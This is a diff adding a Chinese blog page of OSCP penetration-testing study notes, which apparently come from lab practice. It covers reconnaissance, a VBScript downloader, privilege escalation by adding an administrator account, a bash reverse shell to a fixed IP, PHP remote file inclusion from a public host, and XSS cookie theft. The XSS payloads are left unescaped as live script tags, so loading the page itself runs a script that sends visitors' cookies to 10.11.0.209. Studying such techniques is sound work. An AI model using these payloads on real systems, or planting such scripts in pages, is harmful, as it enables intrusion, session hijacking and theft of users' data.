@@ -1,0 +1,317 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>OSCP临时笔记 | Jindom's Blog</title><meta name="author" content="Jindom"><meta name="copyright" content="Jindom"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Kali自带的http服务是apache2,网站根目录在 &#x2F;var&#x2F;www Kali将某些程序加入开机启动项 update-rc.d ssh enable systemctl enable ssh  &#x2F;&#x2F;加入启动项 systemctl ssh start &#x2F;&#x2F;启动 图形化启动项管理软件rcconf   cat index.html |grep “href&#x3D;”|cut -d”&#x2F;“ -f 3|grep">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OSCP临时笔记">
+<meta property="og:url" content="https://blog.jinzz.cc/0dd0015d027f/index.html">
+<meta property="og:site_name" content="Jindom&#39;s Blog">
+<meta property="og:description" content="Kali自带的http服务是apache2,网站根目录在 &#x2F;var&#x2F;www Kali将某些程序加入开机启动项 update-rc.d ssh enable systemctl enable ssh  &#x2F;&#x2F;加入启动项 systemctl ssh start &#x2F;&#x2F;启动 图形化启动项管理软件rcconf   cat index.html |grep “href&#x3D;”|cut -d”&#x2F;“ -f 3|grep">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.jinzz.cc/images/cover14.jpg">
+<meta property="article:published_time" content="2017-09-24T00:00:00.000Z">
+<meta property="article:modified_time" content="2021-06-01T08:43:16.047Z">
+<meta property="article:author" content="Jindom">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.jinzz.cc/images/cover14.jpg"><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="https://blog.jinzz.cc/0dd0015d027f/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'OSCP临时笔记',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-06-01 16:43:16'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">125</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/cover14.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Jindom's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">OSCP临时笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2017-09-24T00:00:00.000Z" title="发表于 2017-09-24 08:00:00">2017-09-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-06-01T08:43:16.047Z" title="更新于 2021-06-01 16:43:16">2021-06-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/oscp/">oscp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="OSCP临时笔记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>Kali自带的http服务是apache2,网站根目录在</p>
+<p>/var/www</p>
+<p>Kali将某些程序加入开机启动项</p>
+<p>update-rc.d ssh enable</p>
+<p>systemctl enable ssh  //加入启动项</p>
+<p>systemctl ssh start //启动</p>
+<p>图形化启动项管理软件rcconf</p>
+<p> </p>
+<p>cat index.html |grep “href=”|cut -d”/“ -f 3|grep “cisco.com”|cut -d’”‘ -f 1|sort -u &gt;cisco.txt</p>
+<p>index.html为思科官网的主页文件,目标是提取网页中所有和思科相关的网址</p>
+<p>第一个过滤规则  |grep “href=”  的意思是保留所有有href=这一字符串的行</p>
+<p>第二个过滤规则的 -d”/“ 是以 / 为分界将每行文本划为不同的块 -d 理解为divide</p>
+<p>-f 的意思是选中第三块的内容作为需要的内容</p>
+<p>第三个过滤规则意思是保留有cisco.com的行</p>
+<p>第四个过滤规则是排除掉网址后不需要的块</p>
+<p>第五个规则是合并所有相同的</p>
+<p>&gt; cisco.txt 意思是将结果导入到cisco.txt并保存</p>
+<p> </p>
+<p>#!/bin/bash<br>for url in $(cat cisco.txt);do<br>host $url |grep “has address” |cut -d” “ -f 4 &amp;<br>done</p>
+<p>这个脚本的意思是将cisco.txt中的所有网址都通过host命令过滤截取出ip</p>
+<p>后面加个&amp;的意思是当条命令同时多线程运行</p>
+<p> </p>
+<p>#!/bin/bash<br>for ip in $(seq 1 254);do<br>ping -c 1 10.11.1.$ip |grep “bytes from” |cut -d “” -f 4 |cut -d”:” -f 1 &amp;<br>done</p>
+<p>这个命令的意思是ping 10.11.1.0/24的ip各一次,并显示有结果的ip</p>
+<p> </p>
+<p>nc -vn 10.11.12.13 25 可以起到 telnet 10.11.12.13 25的效果</p>
+<p> </p>
+<p>host -t ns megacorpone.com</p>
+<p>查询megacorpone.com的dns服务器</p>
+<p>host -l megacorpone.com ns2.megacorpone.com</p>
+<p>连接到ns2.megacorpone.com，并查询获取所有megacorpone的子域名</p>
+<p>SNMP协议  经常被人忽视  UDP161端口 貌似直接扫扫不出来开不开放</p>
+<p>扫描命令:   需要一个community文件和ip列表文件</p>
+<p>onesixtyone -c community -i ip</p>
+<h4 id="community"><a href="#community" class="headerlink" title="community"></a>community</h4><p>public</p>
+<p>private</p>
+<p>manager</p>
+<h5 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h5><p>10.11.1.1</p>
+<p>10.11.1.2</p>
+<p>10.11.1.3</p>
+<p>写脚本爽过吸大麻</p>
+<p>SNMP扫描器</p>
+<p>编译linux下的.c文件使用gcc</p>
+<p>gcc example.c -o balabala</p>
+<p>./balabala</p>
+<p>编译Windows环境下的.c文件使用mingw32</p>
+<p>究极windows下的wget.vbs程序,适用于下载简单exe</p>
+<p>echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs<br>echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs<br>echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs<br>echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs<br>echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs<br>echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs<br>echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs<br>echo Err.Clear &gt;&gt; wget.vbs<br>echo Set http = Nothing &gt;&gt; wget.vbs<br>echo Set http = CreateObject(“WinHttp.WinHttpRequest.5.1”) &gt;&gt; wget.vbs<br>echo If http Is Nothing Then Set http = CreateObject(“WinHttp.WinHttpRequest”) &gt;&gt; wget.vbs<br>echo If http Is Nothing Then Set http = CreateObject(“MSXML2.ServerXMLHTTP”) &gt;&gt; wget.vbs<br>Echo If http Is Nothing Then Set http = CreateObject(“Microsoft.XMLHTTP”) &gt;&gt; wget.vbs<br>echo http.Open “GET”, strURL, False &gt;&gt; wget.vbs<br>echo http.Send &gt;&gt; wget.vbs<br>echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs<br>echo Set http = Nothing &gt;&gt; wget.vbs<br>echo Set fs = CreateObject(“Scripting.FileSystemObject”) &gt;&gt; wget.vbs<br>echo Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs<br>echo strData = “” &gt;&gt; wget.vbs<br>echo strBuffer = “” &gt;&gt; wget.vbs<br>echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs<br>echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs<br>echo Next &gt;&gt; wget.vbs<br>echo ts.Close &gt;&gt; wget.vbs</p>
+<p> </p>
+<p>使用方法,直接复制到shell,在目标机桌面会生成wget.vbs</p>
+<p>cscript wget.vbs <a target="_blank" rel="noopener" href="http://www.jinzz.cc/nc.exe">http://www.jinzz.cc/nc.exe</a> nc.exe</p>
+<p>这样就可以下载nc.exe</p>
+<h3 id="Shadow-密码文件"><a href="#Shadow-密码文件" class="headerlink" title="Shadow - 密码文件"></a>Shadow - 密码文件</h3><p>登录Linux时会要求输入用户名和密码。通常本地文件中会存储一份用户密码，并与用户输入对比，如果相同就允许用户登录。起初用户密码存储于<code>/etc/passwd</code>中，但由于/etc/passwd必须供所有用户读取，因此为避免密码破译，Unix系统将加密后的密码存储于<code>/etc/shadow</code>中，仅供超级用户可读（大型站点中使用NIS、LDAP、NIS+等方式存储）。</p>
+<p>/etc/shadow中的密码格式：</p>
+<p>$id$salt$encrypted</p>
+<p>id表示hash算法。起初密码用DES算法加密，但因随DES加密破解难度的降低，已用其他加密算法替代DES。在shadow文件中，密码字段如果以”$”打头，则表示<strong>非DES加密</strong>，如：</p>
+<p>$1$2eWq10AC$NaQqalCk3InEPBrIxjaJQ1</p>
+<p>即表示非DES加密密码。而<code>$1$</code>表示使用了基于MD5的加密算法。</p>
+<p>$2a$04$NZJWn7W2skvQRC5lW3H7q.ZTE8bz4xbCAtU1ttzUOy63si3phphUu</p>
+<p><code>$2a$</code>表示Blowfish算法。常见的标识与算法：</p>
+<p>$1$   MD5</p>
+<p>$2a$ Blowfish</p>
+<p>$5$ SHA256</p>
+<p>$6$ SHA512</p>
+<p>/etc/passwd文件</p>
+<p>/etc/passwd文件的格式：</p>
+<p>username:passwd:UID:GID:full_name:directory:shell</p>
+<h3 id="etc-shadow文件"><a href="#etc-shadow文件" class="headerlink" title="/etc/shadow文件"></a>/etc/shadow文件</h3><p>首先从shadow文件中摘录数行：</p>
+<p>root:$1$TCVDVaiT$JC7TbKjvIZpIprdehWFH/1:15157:0:99999:7::: bin:*:15157:0:99999:7::: daemon:*:15157:0:99999:7:::</p>
+<p>/etc/shadow文件的每行由9个字段组成，以”:”作为字段分隔符。每个字段的说明：</p>
+<ol>
+<li>用户名（login name）。</li>
+<li>加密后的密码（形如：$1$2eWq10AC$NaQqalCk3InEPBrIxjaJQ1）。如果密码是”*“或”!”，则表示这个不会用这个帐号来登录（通常是一些后台进程）。</li>
+<li>密码最后修改时间，从1970年1月1日起计算的天数。</li>
+<li>不可修改密码的天数。如果是0，表示随时可修改密码。如果是N，表示N天后才能修改密码。</li>
+<li>密码可以维系的天数。如果设置为N，则表示N天后必须更新密码。设置为99999通常表示无需更新密码。</li>
+<li>在密码必须修改前的N天，就开始提示用户需要修改密码。</li>
+<li>密码过期的宽限时间。</li>
+<li>帐号失效时间。也是UNIX时间戳格式。</li>
+<li>最后一个字段是保留字段。</li>
+</ol>
+<p> </p>
+<p> </p>
+<h3 id="Windows本地missconfigration提权"><a href="#Windows本地missconfigration提权" class="headerlink" title="Windows本地missconfigration提权"></a>Windows本地missconfigration提权</h3><p>查看windows上运行服务的所需权限</p>
+<p>windows+R   service.msc</p>
+<p>查看正在运行的服务</p>
+<p>右键属性找到.exe文件</p>
+<p>在cmd内cd到指定目录</p>
+<p>icacls xxx.exe</p>
+<p>即可查看到当前exe运行所需的权限</p>
+<p>如果观察到当前exe有类似于EVERYONE之类的权限就说明有missconfigration</p>
+<p>可以用一个恶意exe文件去代替</p>
+<p>#include &lt;stdlib.h&gt;</p>
+<p>int main()</p>
+<p>{ </p>
+<p>int i;</p>
+<p> i = system (“net localgroup administrators xxxx /add”) </p>
+<p>return 0;</p>
+<p>}</p>
+<p>再使用</p>
+<p>i586-mingw32msvc-gcc xxxx.c</p>
+<p>将其编译成.exe文件并发送到目标机器上,使其服务重启即可添加xxxx用户到administrators权限组中</p>
+<p> </p>
+<h3 id="Linux本地missconfigration提权"><a href="#Linux本地missconfigration提权" class="headerlink" title="Linux本地missconfigration提权"></a>Linux本地missconfigration提权</h3><p>find / -perm -2 ! -type l -ls 2&gt;/dev/null</p>
+<p>寻找有777权限的错误配置的文件,特别是一些第三方软件的.sh脚本</p>
+<p>在其中插入恶意代码</p>
+<p>bash -i &gt;&amp; /dev/tcp/192.168.100.118/443 0&gt;&amp;1</p>
+<p>这个是向192.168.100.118:443发送了一个最高权限的shell</p>
+<p> </p>
+<h3 id="通过XSS劫持Cookies并伪造Cookie登录"><a href="#通过XSS劫持Cookies并伪造Cookie登录" class="headerlink" title="通过XSS劫持Cookies并伪造Cookie登录"></a>通过XSS劫持Cookies并伪造Cookie登录</h3><p>需要使用firefox浏览器并安装两个add-one</p>
+<p>cookies manager +</p>
+<p>temper data</p>
+<p> </p>
+<p>目标站点未对用户输入进行过滤,导致用户可以上传一段包含脚本的字符,从而使接下来浏览该网页的人受到影响</p>
+<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171010160628.png"></p>
+<script>alert("XSS");</script>
+
+<p> </p>
+<p>更进一步,将XSS脚本改为</p>
+<script>
+new Image().src="http://10.11.0.209:4444/bogus.php?output="+document.cookie;
+</script>
+
+<p>就会向10.11.0.209这台机子的4444端口发送连接信息,即可获得当前受害者机器的cookies</p>
+<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171010163738.png"> <img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171010164025.png"> <img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171010164051.png"></p>
+<p>再使用当前获取的受害者cookies信息伪造成自己的cookies信息就可以以受害者的身份登录</p>
+<p> </p>
+<p> </p>
+<p>注意用PHP编写的网页例如切换语言时是否有<a target="_blank" rel="noopener" href="http://xxxxxxx/addguestbook.php?name=hahaha&amp;comment=hahaha&amp;LANG=fr&amp;Submit=Submit">http://xxxxxxx/addguestbook.php?name=hahaha&amp;comment=hahaha&amp;LANG=fr&amp;Submit=Submit</a></p>
+<p>这样的链接,注意红字标明的位置,如果该服务器PHP配置时未进行正确配置,allow_url_fopen = on 时此处可以替换成恶意链接.</p>
+<p><a target="_blank" rel="noopener" href="http://47.90.101.155/evil.txt%E7%9A%84%E5%86%85%E5%AE%B9%E4%B8%BAphp%E8%AF%AD%E8%A8%80">http://47.90.101.155/evil.txt的内容为php语言</a></p>
+<p>echo ‘<?php echo shell\_exec("ipconfig");?>‘ &gt;/var/www/evil.txt</p>
+<p>任何用户输入该链接</p>
+<p><a target="_blank" rel="noopener" href="http://xxxxxxx/addguestbook.php?name=hahaha&amp;comment=hahaha&amp;LANG=http://47.90.101.155/evil.txt%00&amp;Submit=Submit">http://xxxxxxx/addguestbook.php?name=hahaha&amp;comment=hahaha&amp;LANG=http://47.90.101.155/evil.txt%00&amp;Submit=Submit</a></p>
+<p>该处%00意为忽略%00后面的代码段</p>
+<p>执行后/var/www/evil.txt处会保存有该服务器ipconfig后的结果</p>
+<p> </p>
+<p>WEB相关工具</p>
+<p>nikto</p>
+<p>dirbuster</p>
+<p>gobuster</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Jindom</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.jinzz.cc/0dd0015d027f/">https://blog.jinzz.cc/0dd0015d027f/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.jinzz.cc" target="_blank">Jindom's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/images/cover14.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/56833d657261/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Windows缓冲区溢出理解及实验</div></div></a></div><div class="next-post pull-right"><a href="/0bb951b55823/"><img class="next-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover6.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">centos7系统备份与还原</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Jindom</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">125</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/jindom"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/jindom" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:jinzz@jinzz.cc" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#community"><span class="toc-number">1.</span> <span class="toc-text">community</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ip"><span class="toc-number">1.1.</span> <span class="toc-text">ip</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shadow-%E5%AF%86%E7%A0%81%E6%96%87%E4%BB%B6"><span class="toc-number"></span> <span class="toc-text">Shadow - 密码文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-shadow%E6%96%87%E4%BB%B6"><span class="toc-number"></span> <span class="toc-text">&#x2F;etc&#x2F;shadow文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E6%9C%AC%E5%9C%B0missconfigration%E6%8F%90%E6%9D%83"><span class="toc-number"></span> <span class="toc-text">Windows本地missconfigration提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%9C%AC%E5%9C%B0missconfigration%E6%8F%90%E6%9D%83"><span class="toc-number"></span> <span class="toc-text">Linux本地missconfigration提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87XSS%E5%8A%AB%E6%8C%81Cookies%E5%B9%B6%E4%BC%AA%E9%80%A0Cookie%E7%99%BB%E5%BD%95"><span class="toc-number"></span> <span class="toc-text">通过XSS劫持Cookies并伪造Cookie登录</span></a></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/333a4773e2de/" title="Hi Hexo!"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover15.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hi Hexo!"/></a><div class="content"><a class="title" href="/333a4773e2de/" title="Hi Hexo!">Hi Hexo!</a><time datetime="2021-06-03T16:00:00.000Z" title="发表于 2021-06-04 00:00:00">2021-06-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/57793b1394cf/" title="Nginx启用Alt-Svc加速网站访问速度"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nginx启用Alt-Svc加速网站访问速度"/></a><div class="content"><a class="title" href="/57793b1394cf/" title="Nginx启用Alt-Svc加速网站访问速度">Nginx启用Alt-Svc加速网站访问速度</a><time datetime="2021-02-20T00:00:00.000Z" title="发表于 2021-02-20 08:00:00">2021-02-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/54a54b32a7f3/" title="AD拿域控权限的方法整理"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AD拿域控权限的方法整理"/></a><div class="content"><a class="title" href="/54a54b32a7f3/" title="AD拿域控权限的方法整理">AD拿域控权限的方法整理</a><time datetime="2020-10-26T00:00:00.000Z" title="发表于 2020-10-26 08:00:00">2020-10-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/1fc49bae5dd1/" title="Cobalt Strike TeamServer CloudFlare HTTPS 防溯源部署"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover18.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cobalt Strike TeamServer CloudFlare HTTPS 防溯源部署"/></a><div class="content"><a class="title" href="/1fc49bae5dd1/" title="Cobalt Strike TeamServer CloudFlare HTTPS 防溯源部署">Cobalt Strike TeamServer CloudFlare HTTPS 防溯源部署</a><time datetime="2020-09-24T00:00:00.000Z" title="发表于 2020-09-24 08:00:00">2020-09-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/f5858198c6fa/" title="蓝队实战笔记"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蓝队实战笔记"/></a><div class="content"><a class="title" href="/f5858198c6fa/" title="蓝队实战笔记">蓝队实战笔记</a><time datetime="2020-08-15T00:00:00.000Z" title="发表于 2020-08-15 08:00:00">2020-08-15</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;1949 - 2021 By Jindom</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" 